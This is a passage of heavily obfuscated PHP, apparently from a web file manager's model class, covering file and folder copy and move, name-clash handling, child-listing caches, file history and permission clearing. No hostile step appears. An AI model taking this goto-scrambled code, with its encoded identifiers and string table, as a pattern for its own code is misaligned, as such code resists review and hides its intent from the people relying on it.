$E‹ĞÂ‹¤ÛĞ, $FÏ¹áã…¯‘, !1); } } } else { if ($E‹ĞÂ‹¤ÛĞ == REPEAT_RENAME || $E‹ĞÂ‹¤ÛĞ == REPEAT_RENAME_FOLDER) { $aëÒ¥øà‡ù = $this->fileNameAutoCache($E¬¡äÀ¥, $aëÒ¥øà‡ù, $E‹ĞÂ‹¤ÛĞ, $E¯ŒŒÙí™ë); $bÇ¡ì¨ÜäŸ = $this->_copyCreate($B’ÄÌ‘¢±, $E¬¡äÀ¥, $aëÒ¥øà‡ù, $FÏ¹áã…¯‘); } else { if ($E‹ĞÂ‹¤ÛĞ == REPEAT_REPLACE) { $d©ìÛŒ“ë  = $this->sourceInfoCache($B‘¡¦Õ«°Ë); $C ˆÕöáÎ÷ = $this->fileHistory($d©ìÛŒ“ë , $B²§öŒğó²[$E×Ğ™ƒé²[456]], $B²§öŒğó²[$E×Ğ™ƒé²[78]]); if ($C ˆÕöáÎ÷) { $FÏ¹áã…¯‘[$E×Ğ™ƒé²[538]][] = $B²§öŒğó²[$E×Ğ™ƒé²[456]]; } } else { if ($E‹ĞÂ‹¤ÛĞ == REPEAT_SKIP) { } } } Hook::trigger($E×Ğ™ƒé²[543], array($E×Ğ™ƒé²[544], $B²§öŒğó², 0)); } goto f×Ä†„ªêç; DËÒòÏ¬: } private function _copyCreate($D…Ñµ”ƒİ×, $båµ…Î¤Ç, $CÀ•â””¯², &$F¹¸…÷ğÃæ) { goto dïƒ·äøƒ; BùñÕ‘¾ê: $bØµ“½Æšù = $this->_makeItemData($F é÷‡¥Ù, $dŠÄÊÊ¼ã, $CÀ•â””¯²); Hook::trigger($f‡ÒõË«›¼[545], $bØµ“½Æšù); Hook::trigger($f‡ÒõË«›¼[546], array($f‡ÒõË«›¼[547], $bØµ“½Æšù, 0)); goto dšŠ©İàºÌ; e»íˆ‚‘é: $this->addAll($DËæ‘ÜˆĞ­, array(), !1); $CõÅ¥õÖê¹ = $this->where(array($f‡ÒõË«›¼[487] => $F™Ê„ ¸))->select(); $d¡äŠà‹äˆ = $this->_childrenMakeRelation($BÃ‰¡ÁÅìŒ, $CõÅ¥õÖê¹); goto C°ƒõá†Ó‘; C°ƒõá†Ó‘: $d¡äŠà‹äˆ[$D…Ñµ”ƒİ×] = $F™Ê„ ¸; $C·í”ÈŒ Ø = array(); $A‡æ§ê¾ê’ = array(); goto DøÌ¸¸ÒŸ; D¹”³‹ŠÅß: $DÏù¡Àã±Ç = $this->sourceInfo($F™Ê„ ¸); foreach ($BÃ‰¡ÁÅìŒ as $C¦Àù„…Ò™) { $fåÜœÙ™ = $this->_makeItemData($C¦Àù„…Ò™, $DÏù¡Àã±Ç, $C¦Àù„…Ò™[$f‡ÒõË«›¼[28]]); $fåÜœÙ™[$f‡ÒõË«›¼[496]] = $C¦Àù„…Ò™[$f‡ÒõË«›¼[496]]; $DËæ‘ÜˆĞ­[] = $fåÜœÙ™; } $this->chunkEventSet($f‡ÒõË«›¼[548], array($f‡ÒõË«›¼[549], $bØµ“½Æšù, $aô›¬›ÑÉƒ)); goto e»íˆ‚‘é; dïƒ·äøƒ: $f‡ÒõË«›¼ =& $_SERVER[úÉ·öƒÑì©]; $F é÷‡¥Ù = $this->sourceInfoCache($D…Ñµ”ƒİ×); $dŠÄÊÊ¼ã = $this->sourceInfoCache($båµ…Î¤Ç); goto BùñÕ‘¾ê; dšŠ©İàºÌ: $F™Ê„ ¸ = $this->add($bØµ“½Æšù); $AÏÊ›††º÷ = array($f‡ÒõË«›¼[404] => $F™Ê„ ¸, $f‡ÒõË«›¼[28] => $CÀ•â””¯²); $this->_copyApplyMeta($AÏÊ›††º÷, $F¹¸…÷ğÃæ); goto DÁÜĞ‚Ò§œ; e—øÇÑ¡Øç: $this->_childrenListAll($D…Ñµ”ƒİ×, $BÃ‰¡ÁÅìŒ); $aô›¬›ÑÉƒ = count($BÃ‰¡ÁÅìŒ); if ($aô›¬›ÑÉƒ == 0) { return $F™Ê„ ¸; } goto D¹”³‹ŠÅß; fæŠ–İìôô: $this->chunkEventSet($f‡ÒõË«›¼[552], array($f‡ÒõË«›¼[553], $bØµ“½Æšù, $aô›¬›ÑÉƒ)); $this->saveAll($A‡æ§ê¾ê’); return $F™Ê„ ¸; goto EÚô¹¶Ô‹; DÁÜĞ‚Ò§œ: if ($F é÷‡¥Ù[$f‡ÒõË«›¼[412]] != $f‡ÒõË«›¼[87]) { $F¹¸…÷ğÃæ[$f‡ÒõË«›¼[538]][] = $F é÷‡¥Ù[$f‡ÒõË«›¼[456]]; return $F™Ê„ ¸; } $BÃ‰¡ÁÅìŒ = array(); $DËæ‘ÜˆĞ­ = array(); goto e—øÇÑ¡Øç; DøÌ¸¸ÒŸ: foreach ($CõÅ¥õÖê¹ as $C¦Àù„…Ò™) { $aî’ĞÁîËÚ = $C¦Àù„…Ò™[$f‡ÒõË«›¼[404]]; $EÀèŠ­‰öÚ = $this->_childrenMatch($d¡äŠà‹äˆ, $C¦Àù„…Ò™, $DÏù¡Àã±Ç); $C·í”ÈŒ Ø[] = array($f‡ÒõË«›¼[404], $aî’ĞÁîËÚ, $f‡ÒõË«›¼[487], $EÀèŠ­‰öÚ[$f‡ÒõË«›¼[487]]); $A‡æ§ê¾ê’[] = array($f‡ÒõË«›¼[404], $aî’ĞÁîËÚ, $f‡ÒõË«›¼[496], $EÀèŠ­‰öÚ[$f‡ÒõË«›¼[496]]); $this->_copyApplyMeta($C¦Àù„…Ò™, $F¹¸…÷ğÃæ); if ($C¦Àù„…Ò™[$f‡ÒõË«›¼[412]] != $f‡ÒõË«›¼[87]) { $F¹¸…÷ğÃæ[$f‡ÒõË«›¼[538]][] = $C¦Àù„…Ò™[$f‡ÒõË«›¼[456]]; } } $this->chunkEventSet($f‡ÒõË«›¼[550], array($f‡ÒõË«›¼[551], $bØµ“½Æšù, $aô›¬›ÑÉƒ)); $this->saveAll($C·í”ÈŒ Ø); goto fæŠ–İìôô; EÚô¹¶Ô‹: } private function _childrenMakeRelation($fĞŠÓäâ‹Û, $b¾ŒÊ‹ä…) { $E¼ƒ²ÉÚÅæ =& $_SERVER[úÉ·öƒÑì©]; $bìİ¾’õñª = array(); $b¯˜ñğ¦Ä = array(); foreach ($fĞŠÓäâ‹Û as $cªÎŠ±¸³) { $EÎ®’¡²ï = $cªÎŠ±¸³[$E¼ƒ²ÉÚÅæ[28]] . $E¼ƒ²ÉÚÅæ[8] . $cªÎŠ±¸³[$E¼ƒ²ÉÚÅæ[496]]; $bìİ¾’õñª[$EÎ®’¡²ï] = $cªÎŠ±¸³[$E¼ƒ²ÉÚÅæ[404]]; } foreach ($b¾ŒÊ‹ä… as $cªÎŠ±¸³) { $EÎ®’¡²ï = $cªÎŠ±¸³[$E¼ƒ²ÉÚÅæ[28]] . $E¼ƒ²ÉÚÅæ[8] . $cªÎŠ±¸³[$E¼ƒ²ÉÚÅæ[496]]; $DÅì Ê‘×¨ = $bìİ¾’õñª[$EÎ®’¡²ï]; $b¯˜ñğ¦Ä[$DÅì Ê‘×¨] = $cªÎŠ±¸³[$E¼ƒ²ÉÚÅæ[404]]; } return $b¯˜ñğ¦Ä; } private function _childrenMatch($aô‡¸å¬ø‚, $F–ØÑá…à, $bĞ§‚–ÜÆ¼) { goto dÂ× ¿óŠ°; dÂ× ¿óŠ°: $AÓ‡£Şæª• =& $_SERVER[úÉ·öƒÑì©]; $Bª¾ÑÁƒí¡ = $bĞ§‚–ÜÆ¼[$AÓ‡£Şæª•[496]]; $BÜØ ÉØ‚¤ = $this->parentLevelArray($F–ØÑá…à[$AÓ‡£Şæª•[496]]); goto AŞÄ¨¶­²; A»çñôØÙ‰: $fâî·å›ãï = $f¬–èïèÄ[count($f¬–èïèÄ) - 1]; return array($AÓ‡£Şæª•[487] => $fâî·å›ãï, $AÓ‡£Şæª•[496] => $Bª¾ÑÁƒí¡); goto aöÚ›–ĞÀ¯; AŞÄ¨¶­²: foreach ($BÜØ ÉØ‚¤ as $F§©¼ïŸÃá) { if (isset($aô‡¸å¬ø‚[$F§©¼ïŸÃá])) { $Bª¾ÑÁƒí¡ .= $aô‡¸å¬ø‚[$F§©¼ïŸÃá] . $AÓ‡£Şæª•[554]; } } $Bª¾ÑÁƒí¡ = rtrim($Bª¾ÑÁƒí¡, $AÓ‡£Şæª•[47]) . $AÓ‡£Şæª•[47]; $f¬–èïèÄ = $this->parentLevelArray($Bª¾ÑÁƒí¡); goto A»çñôØÙ‰; aöÚ›–ĞÀ¯: } private function _makeItemData($BŠ–»Œ¹³À, $d‰¼Ø‚ß……, $f«É˜øíÎÛ) { $A×í¸à…Ù =& $_SERVER[úÉ·öƒÑì©]; $Bê‡ÊÆ•ì˜ = array($A×í¸à…Ù[555] => $BŠ–»Œ¹³À[$A×í¸à…Ù[412]], $A×í¸à…Ù[422] => $f«É˜øíÎÛ, $A×í¸à…Ù[556] => $BŠ–»Œ¹³À[$A×í¸à…Ù[414]], $A×í¸à…Ù[457] => $BŠ–»Œ¹³À[$A×í¸à…Ù[456]], $A×í¸à…Ù[557] => $BŠ–»Œ¹³À[$A×í¸à…Ù[78]], $A×í¸à…Ù[558] => $d‰¼Ø‚ß……[$A×í¸à…Ù[413]], $A×í¸à…Ù[559] => $d‰¼Ø‚ß……[$A×í¸à…Ù[493]], $A×í¸à…Ù[560] => USER_ID, $A×í¸à…Ù[561] => USER_ID, $A×í¸à…Ù[403] => $d‰¼Ø‚ß……[$A×í¸à…Ù[404]], $A×í¸à…Ù[562] => $d‰¼Ø‚ß……[$A×í¸à…Ù[496]] . $d‰¼Ø‚ß……[$A×í¸à…Ù[404]] . $A×í¸à…Ù[47], $A×í¸à…Ù[426] => $BŠ–»Œ¹³À[$A×í¸à…Ù[84]], $A×í¸à…Ù[431] => 0, $A×í¸à…Ù[563] => $A×í¸à…Ù[33]); return $Bê‡ÊÆ•ì˜; } private function _copyApplyMeta($D“ñ‹ªÓ´å, &$C‚‘áÊÚ‡¼) { $dÑ£ô•ÒÄ‚ =& $_SERVER[úÉ·öƒÑì©]; $D’ÌºêÙ‘ò = $D“ñ‹ªÓ´å[$dÑ£ô•ÒÄ‚[404]]; $c´ñ»™ÚŠ© = $D“ñ‹ªÓ´å[$dÑ£ô•ÒÄ‚[28]]; if (!isset($D“ñ‹ªÓ´å[$dÑ£ô•ÒÄ‚[564]]) || !$D“ñ‹ªÓ´å[$dÑ£ô•ÒÄ‚[564]] || $D“ñ‹ªÓ´å[$dÑ£ô•ÒÄ‚[564]] == $dÑ£ô•ÒÄ‚[191]) { $C‚‘áÊÚ‡¼[$dÑ£ô•ÒÄ‚[540]][] = array($dÑ£ô•ÒÄ‚[404], $D’ÌºêÙ‘ò, $dÑ£ô•ÒÄ‚[564], short_id($D’ÌºêÙ‘ò)); } if (Input::check($c´ñ»™ÚŠ©, $dÑ£ô•ÒÄ‚[565])) { $C‚‘áÊÚ‡¼[$dÑ£ô•ÒÄ‚[539]][] = array($dÑ£ô•ÒÄ‚[404] => $D’ÌºêÙ‘ò, $dÑ£ô•ÒÄ‚[93] => $dÑ£ô•ÒÄ‚[453], $dÑ£ô•ÒÄ‚[381] => str_replace($dÑ£ô•ÒÄ‚[50], $dÑ£ô•ÒÄ‚[33], Pinyin::encode($c´ñ»™ÚŠ©))); $C‚‘áÊÚ‡¼[$dÑ£ô•ÒÄ‚[539]][] = array($dÑ£ô•ÒÄ‚[404] => $D’ÌºêÙ‘ò, $dÑ£ô•ÒÄ‚[93] => $dÑ£ô•ÒÄ‚[452], $dÑ£ô•ÒÄ‚[381] => Pinyin::encode($c´ñ»™ÚŠ©, $dÑ£ô•ÒÄ‚[566])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Dæè†­îìä) { goto D«Ú†ŒåÌ…; A´é˜ìÎ¯É: $dÊ‰íĞ”½Œ = array_to_keyvalue($dÊ‰íĞ”½Œ, $FÏŸÍÉç‘ö[404]); foreach ($dÊ‰íĞ”½Œ as $F÷ô“Ï¡‘á) { $B½Ì¶ùõÃô = $F÷ô“Ï¡‘á[$FÏŸÍÉç‘ö[487]]; $Dæè†­îìä = $F÷ô“Ï¡‘á[$FÏŸÍÉç‘ö[404]]; if (!isset($this->_childrenListCache[$Dæè†­îìä]) && $F÷ô“Ï¡‘á[$FÏŸÍÉç‘ö[412]] == $FÏŸÍÉç‘ö[87]) { $this->_childrenListCache[$Dæè†­îìä] = array(); } if (!isset($this->_childrenListCache[$B½Ì¶ùõÃô])) { $this->_childrenListCache[$B½Ì¶ùõÃô] = array(); } $this->_childrenListCache[$B½Ì¶ùõÃô][$Dæè†­îìä] = $F÷ô“Ï¡‘á; $this->_childrenItemCache[$Dæè†­îìä] = $F÷ô“Ï¡‘á; } goto Fµ¶ñ†ë¡; EÌ†‡Â½œË: $E‘ÜÍª¢¬ğ = array($FÏŸÍÉç‘ö[496] => array($FÏŸÍÉç‘ö[521], $AÄ¯×´Àğ¦[$FÏŸÍÉç‘ö[496]] . $Dæè†­îìä . $FÏŸÍÉç‘ö[522]), $FÏŸÍÉç‘ö[432] => $this->targetIsDelete); $dÊ‰íĞ”½Œ = $this->field($cÒ¢¢©¼§¶)->where($E‘ÜÍª¢¬ğ)->select(); if (!$dÊ‰íĞ”½Œ) { return; } goto A´é˜ìÎ¯É; D«Ú†ŒåÌ…: $FÏŸÍÉç‘ö =& $_SERVER[úÉ·öƒÑì©]; $AÄ¯×´Àğ¦ = $this->sourceInfo($Dæè†­îìä); $cÒ¢¢©¼§¶ = $FÏŸÍÉç‘ö[433]; goto EÌ†‡Â½œË; Fµ¶ñ†ë¡: } private function _childrenListAll($D¤’ÙÌìä, &$aø†˜ØŞªé) { $E‚®Ù§‚è =& $_SERVER[úÉ·öƒÑì©]; if (!isset($this->_childrenListCache[$D¤’ÙÌìä])) { return; } $AÊ¨–÷ó² = $this->_childrenListCache[$D¤’ÙÌìä]; foreach ($AÊ¨–÷ó² as $c¥¸ ±Ë³ => $EÉª‹êÔ ) { $aø†˜ØŞªé[$c¥¸ ±Ë³] = $EÉª‹êÔ ; if ($EÉª‹êÔ [$E‚®Ù§‚è[412]] == $E‚®Ù§‚è[87]) { $this->_childrenListAll($c¥¸ ±Ë³, $aø†˜ØŞªé); } } } private function sourceInfoCache($Dë Ø¹­) { if (isset($this->_childrenItemCache[$Dë Ø¹­])) { return $this->_childrenItemCache[$Dë Ø¹­]; } return $this->sourceInfo($Dë Ø¹­); } private function _childrenList($D×§Ã„™ƒ) { if (isset($this->_childrenListCache[$D×§Ã„™ƒ])) { return $this->_childrenListCache[$D×§Ã„™ƒ]; } return $this->_childrenListSelect($D×§Ã„™ƒ); } private function _childrenListSelect($Dœ°±Š†) { goto cƒàì¢ïÄ¹; a§³ßãòÃÙ: foreach ($aİ¦İ·¬ as $Dœ°±Š† => $Aâíƒ›í) { $this->_childrenItemCache[$Dœ°±Š†] = $Aâíƒ›í; } return $aİ¦İ·¬; goto BêÖƒÉ‡Ô; cƒàì¢ïÄ¹: $fĞ¹ÒÊÖ¡™ =& $_SERVER[úÉ·öƒÑì©]; $d“Ú–¡ÛÖó = array($fĞ¹ÒÊÖ¡™[487] => $Dœ°±Š†, $fĞ¹ÒÊÖ¡™[432] => $this->targetIsDelete); $cÌõà„íÌä = $this->where($d“Ú–¡ÛÖó)->select(); goto D¡ÉÆ«ÍÉØ; D¡ÉÆ«ÍÉØ: $cÌõà„íÌä = $cÌõà„íÌä ? $cÌõà„íÌä : array(); $aİ¦İ·¬ = array_to_keyvalue($cÌõà„íÌä, $fĞ¹ÒÊÖ¡™[404]); $this->_childrenListCache[$Dœ°±Š†] = $aİ¦İ·¬; goto a§³ßãòÃÙ; BêÖƒÉ‡Ô: } private function fileNameExistCache($e¿³¾Ò‘Åñ, $e“àÊ÷Ü) { $DœÏñäë =& $_SERVER[úÉ·öƒÑì©]; $e“àÊ÷Ü = strtolower($e“àÊ÷Ü); $cöËä…øò = $this->_childrenList($e¿³¾Ò‘Åñ); foreach ($cöËä…øò as $c„Ü«Ù´èè) { if ($e“àÊ÷Ü == strtolower($c„Ü«Ù´èè[$DœÏñäë[28]])) { return $c„Ü«Ù´èè[$DœÏñäë[404]]; } } return !1; } private function fileNameAutoCache($b‰ìÙ‰„»æ, $eµÅ•è¹…, $Dá×ë‘ëÃ, $b‚ÒŠ“è¸½) { $aÙ¨’İ‰İ =& $_SERVER[úÉ·öƒÑì©]; $a²¹äîõ = $this->_childrenList($b‰ìÙ‰„»æ); $d÷¸ÄÑİ£… = array_to_keyvalue($a²¹äîõ, $aÙ¨’İ‰İ[33], $aÙ¨’İ‰İ[28]); return $this->fileNameAutoGet($d÷¸ÄÑİ£…, $eµÅ•è¹…, $Dá×ë‘ëÃ, $b‚ÒŠ“è¸½); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($C˜É‰µİğù, $A‹‹ßÙ¢éŠ, $a–¾§¬¨²± = REPEAT_REPLACE, $BïãîóßºÆ = '') { goto DíãÀ¯ÁÊÃ; c’ÎØ„Õî„: $this->folderSizeReset($A‹‹ßÙ¢éŠ); $d“Î·”‹  = array($fÅÚÎ§ëš‰[$d»¬ƒóğÒ[487]], $A‹‹ßÙ¢éŠ); if ($fÅÚÎ§ëš‰[$d»¬ƒóğÒ[412]] == $d»¬ƒóğÒ[87]) { $d“Î·”‹ [] = $C˜É‰µİğù; } goto E‘Íïœ—©ô; a”¥­Âëçå: $D††ÁŠÌ¶ = $this->fileNameExistCache($A‹‹ßÙ¢éŠ, $fÅÚÎ§ëš‰[$d»¬ƒóğÒ[28]]); $dõ‘ÕíÍ±ñ = $this->_move($C˜É‰µİğù, $A‹‹ßÙ¢éŠ, $a–¾§¬¨²±, $B—†®ŒİØ, $BïãîóßºÆ); $this->sourceCacheClear(); goto DèšÇàâÓ; E‘Íïœ—©ô: $this->updateModifyTime($d“Î·”‹ ); Model($d»¬ƒóğÒ[542])->eventMove($C˜É‰µİğù, $fÅÚÎ§ëš‰[$d»¬ƒóğÒ[487]], $A‹‹ßÙ¢éŠ); Hook::trigger($d»¬ƒóğÒ[568], $c…º³ÚäÕ‚); goto dƒœ—ø«; dƒœ—ø«: return $dõ‘ÕíÍ±ñ; goto A‚…­ÑÇ¿‘; fÁßã‘„: if ($fÅÚÎ§ëš‰[$d»¬ƒóğÒ[487]] == $c´™¢é“İ•[$d»¬ƒóğÒ[404]]) { if ($fÅÚÎ§ëš‰[$d»¬ƒóğÒ[432]] == $d»¬ƒóğÒ[87]) { Model($d»¬ƒóğÒ[430])->restore(array($C˜É‰µİğù)); } if (!$BïãîóßºÆ || $BïãîóßºÆ == $fÅÚÎ§ëš‰[$d»¬ƒóğÒ[28]]) { return $C˜É‰µİğù; } } $c…º³ÚäÕ‚ = $this->pathInfoMore($C˜É‰µİğù); if ($this->isParentOf($C˜É‰µİğù, $A‹‹ßÙ¢éŠ)) { return !1; } goto dÊÆùŒóÛÚ; A…¨Öáº«ù: if ($fÅÚÎ§ëš‰[$d»¬ƒóğÒ[487]] == $A‹‹ßÙ¢éŠ && $BïãîóßºÆ != $fÅÚÎ§ëš‰[$d»¬ƒóğÒ[28]]) { $a·ù„Œ…ÏÖ = $this->fileNameExist($A‹‹ßÙ¢éŠ, $BïãîóßºÆ); if ($a·ù„Œ…ÏÖ && $fÅÚÎ§ëš‰[$d»¬ƒóğÒ[412]] == $d»¬ƒóğÒ[191]) { goto C„ÙÓÆ®‹Š; FÃ³˜ô”«›: return $a·ù„Œ…ÏÖ; goto Aë×àğªÔ; c¶¾èµêŒ: $this->removeNow($C˜É‰µİğù, !1); $this->folderSizeReset($A‹‹ßÙ¢éŠ); Hook::trigger($d»¬ƒóğÒ[568], $c…º³ÚäÕ‚); goto FÃ³˜ô”«›; C„ÙÓÆ®‹Š: $dŸ×¡“’© = $this->sourceInfo($a·ù„Œ…ÏÖ); $FÛÌ¸¥á­ = $this->fileHistory($dŸ×¡“’©, $fÅÚÎ§ëš‰[$d»¬ƒóğÒ[456]], $fÅÚÎ§ëš‰[$d»¬ƒóğÒ[78]]); if (!$FÛÌ¸¥á­) { Model($d»¬ƒóğÒ[459])->remove($fÅÚÎ§ëš‰[$d»¬ƒóğÒ[456]]); } goto c¶¾èµêŒ; Aë×àğªÔ: } } $Eç÷Â¶âí… = $BïãîóßºÆ ? $BïãîóßºÆ : $fÅÚÎ§ëš‰[$d»¬ƒóğÒ[28]]; $this->lockMoveStart($C˜É‰µİğù); goto cåé„¾Ì»Ö; DíãÀ¯ÁÊÃ: $d»¬ƒóğÒ =& $_SERVER[úÉ·öƒÑì©]; $fÅÚÎ§ëš‰ = $this->sourceInfo($C˜É‰µİğù); $c´™¢é“İ• = $this->sourceInfo($A‹‹ßÙ¢éŠ); goto fÁßã‘„; DèšÇàâÓ: if ($fÅÚÎ§ëš‰[$d»¬ƒóğÒ[412]] == $d»¬ƒóğÒ[87] && $D††ÁŠÌ¶) { $this->folderSizeResetChildren($dõ‘ÕíÍ±ñ); } Model($d»¬ƒóğÒ[193])->linkAdd($B—†®ŒİØ[$d»¬ƒóğÒ[538]]); if ($D††ÁŠÌ¶ && $B—†®ŒİØ[$d»¬ƒóğÒ[569]]) { $this->removeNow($C˜É‰µİğù, !1); } goto dË­¹ê±Û; cåé„¾Ì»Ö: $this->lockWriteStart($A‹‹ßÙ¢éŠ, $Eç÷Â¶âí…); $B—†®ŒİØ = array($d»¬ƒóğÒ[538] => array(), $d»¬ƒóğÒ[569] => !1); $this->clearShare($C˜É‰µİğù, $A‹‹ßÙ¢éŠ); goto a”¥­Âëçå; dÊÆùŒóÛÚ: if (!$fÅÚÎ§ëš‰ || !$c´™¢é“İ• || $c´™¢é“İ•[$d»¬ƒóğÒ[412]] != $d»¬ƒóğÒ[87]) { return !1; } Hook::trigger($d»¬ƒóğÒ[567], $c…º³ÚäÕ‚); $this->targetIsDelete = intval($fÅÚÎ§ëš‰[$d»¬ƒóğÒ[432]]); goto A…¨Öáº«ù; dË­¹ê±Û: $this->lockMoveEnd($C˜É‰µİğù); $this->lockWriteEnd($A‹‹ßÙ¢éŠ, $Eç÷Â¶âí…); $this->folderSizeReset($fÅÚÎ§ëš‰[$d»¬ƒóğÒ[487]]); goto c’ÎØ„Õî„; A‚…­ÑÇ¿‘: } private function _move($C•×‰Šù, $Cíº§ˆÃÙÛ, $eöïÀÊÓ–¨, &$Cù™ƒˆÑ¢, $c«Š§Ù«•‰ = '') { goto d‘Ûç¢îêí; BĞ«êİ•Ÿ´: $e»²Æà´Û¸ = !1; if ($BŞ¤ê¶Òéô) { if ($eöïÀÊÓ–¨ == REPEAT_RENAME_FOLDER) { $CĞ¤‚Ÿ¬ = $this->fileNameAuto($Cíº§ˆÃÙÛ, $CĞ¤‚Ÿ¬, $eöïÀÊÓ–¨, $BŞ¤ê¶Òéô); $BÕÍ§ÁÓ‚ = $this->_moveForce($C•×‰Šù, $Cíº§ˆÃÙÛ, $CĞ¤‚Ÿ¬); } else { if ($eöïÀÊÓ–¨ == REPEAT_RENAME_FOLDER) { $eöïÀÊÓ–¨ = REPEAT_RENAME; } $bË°ŠŸÛ™‡ = $this->_childrenListSelect($C•×‰Šù); foreach ($bË°ŠŸÛ™‡ as $d´ÕŠÛÆ¾ ) { $this->_move($d´ÕŠÛÆ¾ [$f‹ˆ¸¯šÀ[404]], $bå…¥Óâå, $eöïÀÊÓ–¨, $Cù™ƒˆÑ¢); } $e»²Æà´Û¸ = !0; } } else { if ($eöïÀÊÓ–¨ == REPEAT_SKIP) { $e»²Æà´Û¸ = !0; } else { if ($eöïÀÊÓ–¨ == REPEAT_RENAME || $eöïÀÊÓ–¨ == REPEAT_RENAME_FOLDER) { $CĞ¤‚Ÿ¬ = $this->fileNameAuto($Cíº§ˆÃÙÛ, $CĞ¤‚Ÿ¬, $eöïÀÊÓ–¨, $BŞ¤ê¶Òéô); $BÕÍ§ÁÓ‚ = $this->_moveForce($C•×‰Šù, $Cíº§ˆÃÙÛ, $CĞ¤‚Ÿ¬); } else { if ($eöïÀÊÓ–¨ == REPEAT_REPLACE) { $a—¢„ó„îĞ = $this->sourceInfoCache($bå…¥Óâå); $A¡§ŠŠ” = $this->fileHistory($a—¢„ó„îĞ, $FÍ³Äì×â[$f‹ˆ¸¯šÀ[456]], $FÍ³Äì×â[$f‹ˆ¸¯šÀ[78]]); if ($A¡§ŠŠ”) { $Cù™ƒˆÑ¢[$f‹ˆ¸¯šÀ[538]][] = $FÍ³Äì×â[$f‹ˆ¸¯šÀ[456]]; } else { $e»²Æà´Û¸ = !0; } } } } } if ($e»²Æà´Û¸ && !$Cù™ƒˆÑ¢[$f‹ˆ¸¯šÀ[569]]) { $Cù™ƒˆÑ¢[$f‹ˆ¸¯šÀ[569]] = !0; } goto FÖÅ‘Õö±; FÖÅ‘Õö±: return $BÕÍ§ÁÓ‚; goto eØÜáÚŒğ; DÆÂæ‹ÓŠ: $CĞ¤‚Ÿ¬ = $c«Š§Ù«•‰ ? $c«Š§Ù«•‰ : $FÍ³Äì×â[$f‹ˆ¸¯šÀ[28]]; $bå…¥Óâå = $this->fileNameExistCache($Cíº§ˆÃÙÛ, $CĞ¤‚Ÿ¬); $this->lockMoveStart($C•×‰Šù); goto d‹ÆÜŞ½”é; d‘Ûç¢îêí: $f‹ˆ¸¯šÀ =& $_SERVER[úÉ·öƒÑì©]; $FÍ³Äì×â = $this->sourceInfo($C•×‰Šù); $BŞ¤ê¶Òéô = $FÍ³Äì×â[$f‹ˆ¸¯šÀ[412]] == $f‹ˆ¸¯šÀ[87]; goto DÆÂæ‹ÓŠ; d‹ÆÜŞ½”é: $this->lockWriteStart($Cíº§ˆÃÙÛ, $CĞ¤‚Ÿ¬); if (!$bå…¥Óâå) { return $this->_moveForce($C•×‰Šù, $Cíº§ˆÃÙÛ, $CĞ¤‚Ÿ¬); } $BÕÍ§ÁÓ‚ = $bå…¥Óâå; goto BĞ«êİ•Ÿ´; eØÜáÚŒğ: } private function _moveForce($cÃ±¡••È‹, $B¡™…¸“ ğ, $f¹ƒç³÷àŠ) { goto a§Ş®¤—ñ; Cñ·–áÍ·É: if ($aŠèÂñÄ·) { $e§´ß÷ßš = array($cÜ—¹†ÃŸŠ[562] => array($cÜ—¹†ÃŸŠ[521], $EÆÌŠÔ¦Ï…[$cÜ—¹†ÃŸŠ[496]] . $EÆÌŠÔ¦Ï…[$cÜ—¹†ÃŸŠ[404]] . $cÜ—¹†ÃŸŠ[522])); $b†Şœ¨“ÑÎ = $EÆÌŠÔ¦Ï…[$cÜ—¹†ÃŸŠ[496]] . $EÆÌŠÔ¦Ï…[$cÜ—¹†ÃŸŠ[404]] . $cÜ—¹†ÃŸŠ[47]; $B¹£¼¸¤±× = $DñÙñ½Œ¶[$cÜ—¹†ÃŸŠ[496]] . $DñÙñ½Œ¶[$cÜ—¹†ÃŸŠ[404]] . $cÜ—¹†ÃŸŠ[47] . $EÆÌŠÔ¦Ï…[$cÜ—¹†ÃŸŠ[404]] . $cÜ—¹†ÃŸŠ[47]; $E‚¤­„¸ = array($cÜ—¹†ÃŸŠ[562] => array($cÜ—¹†ÃŸŠ[570], "\162\145\x70\154\x61\143\x65\x28\160\141\x72\145\x6e\x74\114\x65\x76\x65\x6c\x2c\47{$b†Şœ¨“ÑÎ}\x27\x2c\47{$B¹£¼¸¤±×}\x27\51"), $cÜ—¹†ÃŸŠ[558] => $DñÙñ½Œ¶[$cÜ—¹†ÃŸŠ[413]], $cÜ—¹†ÃŸŠ[559] => $DñÙñ½Œ¶[$cÜ—¹†ÃŸŠ[493]]); if ($D©¥Ö­ë) { $E‚¤­„¸[$cÜ—¹†ÃŸŠ[431]] = 0; } $this->where($e§´ß÷ßš)->data($E‚¤­„¸)->save(); } $this->where(array($cÜ—¹†ÃŸŠ[419] => $cÃ±¡••È‹))->data($eğØ‡¯Š¹Ÿ)->save(); return $cÃ±¡••È‹; goto fÃ¨æª»¤Ù; fÍ¾Âò–åá: $aŠèÂñÄ· = $EÆÌŠÔ¦Ï…[$cÜ—¹†ÃŸŠ[412]] == $cÜ—¹†ÃŸŠ[87]; $eğØ‡¯Š¹Ÿ = array($cÜ—¹†ÃŸŠ[403] => $DñÙñ½Œ¶[$cÜ—¹†ÃŸŠ[404]], $cÜ—¹†ÃŸŠ[562] => $DñÙñ½Œ¶[$cÜ—¹†ÃŸŠ[496]] . $DñÙñ½Œ¶[$cÜ—¹†ÃŸŠ[404]] . $cÜ—¹†ÃŸŠ[47], $cÜ—¹†ÃŸŠ[558] => $DñÙñ½Œ¶[$cÜ—¹†ÃŸŠ[413]], $cÜ—¹†ÃŸŠ[559] => $DñÙñ½Œ¶[$cÜ—¹†ÃŸŠ[493]], $cÜ—¹†ÃŸŠ[561] => USER_ID, $cÜ—¹†ÃŸŠ[422] => $f¹ƒç³÷àŠ); $bôÈ±øö¼Ø = $EÆÌŠÔ¦Ï…[$cÜ—¹†ÃŸŠ[413]] == SourceModel::TYPE_GROUP && $DñÙñ½Œ¶[$cÜ—¹†ÃŸŠ[413]] == SourceModel::TYPE_GROUP && $EÆÌŠÔ¦Ï…[$cÜ—¹†ÃŸŠ[493]] == $DñÙñ½Œ¶[$cÜ—¹†ÃŸŠ[493]]; goto aÈ†ÎØÂéÏ; aÈ†ÎØÂéÏ: if (!$bôÈ±øö¼Ø && $this->moveClearAuth) { Model($cÜ—¹†ÃŸŠ[491])->authClear($cÃ±¡••È‹); } $D©¥Ö­ë = $EÆÌŠÔ¦Ï…[$cÜ—¹†ÃŸŠ[432]] == $cÜ—¹†ÃŸŠ[87] && 